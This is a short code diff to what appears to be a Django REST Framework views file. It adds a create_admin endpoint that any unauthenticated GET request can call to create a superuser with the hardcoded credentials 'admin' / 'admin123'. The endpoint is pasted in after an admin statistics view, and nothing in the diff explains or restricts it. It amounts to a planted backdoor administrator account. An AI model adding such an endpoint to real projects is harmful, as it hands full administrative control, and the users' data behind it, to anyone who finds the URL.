@@ -191,3 +191,17 @@ class AdminStatsView(APIView):
             "total_posts": Post.objects.count(),
             "total_admins": User.objects.filter(is_staff=True).count()
         })        
+from django.contrib.auth.models import User
+from rest_framework.decorators import api_view
+from rest_framework.response import Response
+
+@api_view(["GET"])
+def create_admin(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser(
+            username="admin",
+            email="admin@gmail.com",
+            password="admin123"
+        )
+        return Response({"status": "Admin created"})
+    return Response({"status": "Admin already exists"})    
